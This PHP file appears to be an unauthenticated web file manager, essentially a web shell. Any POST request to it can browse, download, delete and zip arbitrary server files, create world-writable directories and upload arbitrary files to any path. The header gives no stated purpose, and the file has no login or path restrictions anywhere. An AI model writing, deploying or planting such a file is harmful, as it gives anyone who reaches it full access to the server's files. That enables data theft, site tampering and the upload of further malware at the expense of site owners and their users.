<?php

/**
 * Created by PhpStorm.
 * User: Aleksei Ivanov
 * Date: 07.11.2016
 * Time: 13:16
 */

define(PLUGIN_PATH, $_SERVER['SCRIPT_NAME']);

$home = "";

function ClassFiles()
{
   global $home;
   if(isset($_POST['path'])) {
      if(is_dir($_POST['path']))
         $home = $_POST['path'];
      else if (is_file($_POST['path'])){
         $path = explode("/",$_POST['path']);
         $filename = array_pop($path);
         $home = implode("/",$path);
         header('Content-Type: application/octet-stream'); 
         header("Content-disposition: attachment; filename=\"$filename\"");
         $f = fopen($_POST['path'],"r");
         $file = fread($f, filesize($_POST['path']));
         fclose($f);
         echo $file;
         die();
      }
      else
         $home = $_SERVER['DOCUMENT_ROOT'];
   } else if ( isset($_POST['mkdir']) ) {
      echo "<pre>";
      var_dump( mkdir($_POST['mkdir'],0777,TRUE) );
      echo "</pre>";
      die();
   } else if (isset($_POST['delete'])){
      if(is_dir($_POST['delete']))
         $g = rmdir($_POST['delete']);
      else if (is_file($_POST['delete']))
         $g = unlink($_POST['delete']);
      echo "<pre>";
      var_dump($g);
      echo "</pre>";
      die();
   } else if (isset($_POST['upload_path']))
   {
      $_POST['upload_path']."/".$_FILES['file']['name'];
      $f = fopen($_POST['upload_path']."/".$_FILES['file']['name'], "w+");
      $w = fwrite($f, file_get_contents($_FILES['file']['tmp_name']));
      fclose($f);
      chmod($_POST['upload_path']."/".$_FILES['file']['name'], 0700);
      echo "<pre>";
      var_dump($f);
      var_dump($w);
      echo "</pre>";
      die();
   } else if (isset($_POST['dump_path']))
   {
      $rootPath = realpath($_POST['dump_path']);
      $zip = new ZipArchive();
      $zip->open($_POST['dump_path'].'/../file.zip', ZipArchive::CREATE | ZipArchive::OVERWRITE);
      $files = new RecursiveIteratorIterator(
          new RecursiveDirectoryIterator($rootPath),
          RecursiveIteratorIterator::LEAVES_ONLY
      );

      foreach ($files as $name => $file)
      {
          if (!$file->isDir())
          {
              $filePath = $file->getRealPath();
              $relativePath = substr($filePath, strlen($rootPath) + 1);
              $zip->addFile($filePath, $relativePath);
          }
      }
      $zip->close();
   }
   else
      $home = $_SERVER['DOCUMENT_ROOT'];
   $currentPath = scandir($home);
   $dirs = [];
   foreach ($currentPath as $key => $value) {
      if( !is_file($home."/".$value) ) {
         $dirs[] = $value;unset($currentPath[$key]);
      }
   }
   $currentPath = array_merge($dirs,$currentPath);

   $links = "<table>";
   $links .= "<tr>";
      $links .= "<td>";
      $links .= "name";
      $links .= "</td>";
      $links .= "<td>";
      $links .= "group";
      $links .= "</td>";
      $links .= "<td>";
      $links .= "owner";
      $links .= "</td>";

      $links .= "<td>";
      $links .= "ctime";
      $links .= "</td>";

      $links .= "<td>";
      $links .= "mtime";
      $links .= "</td>";

      $links .= "<td>";
      $links .= "atime";
      $links .= "</td>";

      $links .= "<td>";
      $links .= "perms";
      $links .= "</td>";
   $links .= "</tr>";

   foreach ($currentPath as $key => $value) {

      $links .= "<tr>";

      $links .= "<td>";
      $delete = "<div class='inline'><form action='".PLUGIN_PATH."' method='POST' target='_blank' ><input type='hidden' value='$home/$value' name='delete'><input type='submit' value='x'></form>";

      $dump = "<form action='".PLUGIN_PATH."' method='POST' target='_blank' ><input type='hidden' value='$home/$value' name='dump_path'><input type='submit' value='&#x25BC;'></form>";

      if( !is_file($home."/".$value) ) {
         $links .= $delete.$dump."<a data-url='$home/$value'>$value</a></div>";
      }
      else
         $links .= $delete."<form action='".PLUGIN_PATH."' method='POST' target='_blank' ><input type='hidden' value='$home/$value' name='path'><input type='submit' value='$value'></form></div>";
      $links .= "</td>";
      $links .= "<td>";
      $links .= posix_getgrgid(filegroup($home."/".$value))['name'];
      $links .= "</td>";
      $links .= "<td>";
      $links .= posix_getpwuid(fileowner($home."/".$value))['name'];
      $links .= "</td>";
      $links .= "<td>";
      $links .= date("Y-m-d H:i:s",filectime($home."/".$value));
      $links .= "</td>";
      $links .= "<td>";
      $links .= date("Y-m-d H:i:s",filemtime($home."/".$value));
      $links .= "</td>";
      $links .= "<td>";
      $links .= date("Y-m-d H:i:s",fileatime($home."/".$value));
      $links .= "</td>";
      $perms = fileperms($home."/".$value);
      switch ($perms & 0xF000) {
          case 0xC000: // socket
              $info = 's';
              break;
          case 0xA000: // symbolic link
              $info = 'l';
              break;
          case 0x8000: // regular
              $info = 'r';
              break;
          case 0x6000: // block special
              $info = 'b';
              break;
          case 0x4000: // directory
              $info = 'd';
              break;
          case 0x2000: // character special
              $info = 'c';
              break;
          case 0x1000: // FIFO pipe
              $info = 'p';
              break;
          default: // unknown
              $info = 'u';
      }
      $info .= "|";
      // Owner
      $info .= (($perms & 0x0100) ? 'r' : '-');
      $info .= (($perms & 0x0080) ? 'w' : '-');
      $info .= (($perms & 0x0040) ? (($perms & 0x0800) ? 's' : 'x' ) : (($perms & 0x0800) ? 'S' : '-'));
      $info .= "|";
      // Group
      $info .= (($perms & 0x0020) ? 'r' : '-');
      $info .= (($perms & 0x0010) ? 'w' : '-');
      $info .= (($perms & 0x0008) ? (($perms & 0x0400) ? 's' : 'x' ) : (($perms & 0x0400) ? 'S' : '-'));
      $info .= "|";
      // World
      $info .= (($perms & 0x0004) ? 'r' : '-');
      $info .= (($perms & 0x0002) ? 'w' : '-');
      $info .= (($perms & 0x0001) ? (($perms & 0x0200) ? 't' : 'x' ) : (($perms & 0x0200) ? 'T' : '-'));
      $links .= "<td>";
      $links .= $info;
      $links .= "</td>";
      $links .= "</tr>";
   }
   $links .= "</table>";
   return $links;
}
if (is_file($_POST['path']))
   ClassFiles();
?>
<?php
if (isset($_POST['ajax'])) {
   echo ClassFiles();
} else {
?>
<head>
   <style type="text/css">
      input[type="submit"] {
          display: inline;
          background: transparent;
          border: 0px;
          padding: 0px;
          cursor: pointer;
          text-decoration: underline;
          color: red;
      }
      form{
         padding: 0px;margin: 0px;
      }
      div.inline > * {
         display: inline;
      }
      table {
         border-collapse: collapse;
         border:1px solid #000;
      }
      table td{
         border:1px solid #000;
      }
      #direct_path {
         width:100%;
      }
   </style>
</head>
<body>
   <div><?php print_r(get_current_user()); ?></div>
   <div id="showLinks" class="links">
   <?php
      echo ClassFiles();
   ?>
   </div>
   <br>
   <form action="<?= PLUGIN_PATH ?>" method="POST">
      <input id="direct_path" type="text" name="path" value="<?= $home ?>">
      <button>Open path</button>
   </form><br>
   <form action="<?= PLUGIN_PATH ?>" method="POST">
      <input id="new_dir_path" type="text" name="mkdir" value="<?= $home ?>">
      <button>mkdir</button>
   </form><br>
   <form target='_blank' action="<?= PLUGIN_PATH ?>" method="POST" enctype="multipart/form-data">
      <input type="file" name="file">
      <input type="hidden" name="upload_path" value="<?= $home ?>"><br>
      <button>upload</button>
   </form>
<script>
      function doPost(event)
      {
         var showLinks = document.querySelector("#showLinks");
         var url = "<?= PLUGIN_PATH ?>";
         var params = "path="+this.dataset.url+"&ajax";
         var up_path = document.querySelector('*[name="upload_path"]');
         up_path.value = this.dataset.url;
         var dir_path = document.querySelector('#direct_path');
         dir_path.value = this.dataset.url;
         var xhr = new XMLHttpRequest();
         xhr.open("POST", url, true);
         xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
         xhr.send(params);
         xhr.onreadystatechange = function() {
             if (xhr.readyState == XMLHttpRequest.DONE) {
                 showLinks.innerHTML = xhr.responseText;
                 var links = document.querySelectorAll("*[data-url]");
                  for(var i = 0;i<links.length;i++)
                  {
                     links[i].addEventListener("click", doPost );
                  }
             }
         }
      }
      window.addEventListener("load", function(){
         var links = document.querySelectorAll("*[data-url]");
         for(var i = 0;i<links.length;i++)
         {
            links[i].addEventListener("click", doPost );
         }
      })
</script>
</body>
<?php } ?>
